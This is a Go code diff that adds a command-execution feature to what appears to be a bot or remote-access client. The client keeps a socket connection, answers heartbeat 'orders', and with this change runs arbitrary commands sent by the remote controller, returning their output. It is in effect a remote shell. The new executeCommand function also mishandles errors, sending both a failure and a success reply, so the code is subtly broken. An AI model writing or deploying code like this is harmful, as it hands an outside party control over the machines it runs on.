@@ -8,6 +8,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/user"
 	"runtime"
 	"strings"
@@ -24,11 +25,13 @@ type Client struct {
 
 type Instructions struct {
 	IsHeartbeat bool
+	IsCommand   bool
 	Message     string
 }
 
 type Response struct {
-	Message string
+	Successful bool
+	Message    string
 }
 
 var (
@@ -127,17 +130,44 @@ func awaitInstructions(conn net.Conn) error {
 	switch {
 	///////////////////////////////
 	case inst.IsHeartbeat == true && inst.Message == "PING":
-		resp := Response{Message: "PONG"}
-		err := sendMessage(resp, conn)
-		if err != nil {
+		if err := Heartbeat(conn); err != nil {
 			return err
 		}
 		return nil
 	///////////////////////////////
+	case inst.IsCommand == true:
+		if err := executeCommand(conn, inst.Message); err != nil {
+			return err
+		}
+	///////////////////////////////
 	default:
-		sendMessage(Response{Message: "Unknown order!"}, conn)
+		sendMessage(Response{Successful: false, Message: "Unknown order!"}, conn)
 	}
 	///////////////////////////////
+	return nil
+}
+
+func Heartbeat(conn net.Conn) error {
+	resp := Response{Successful: true, Message: "PONG"}
+	err := sendMessage(resp, conn)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+func executeCommand(conn net.Conn, command string) error {
+	formattedCommand := strings.Fields(command)
+	out, err := exec.Command(formattedCommand[0], formattedCommand[1:]...).Output()
+	if err != nil {
+		resp := Response{Successful: false}
+		sendMessage(resp, conn)
+	}
+	resp := Response{
+		Successful: true,
+		Message:    string(out),
+	}
+	sendMessage(resp, conn)
 	return nil
 }
 
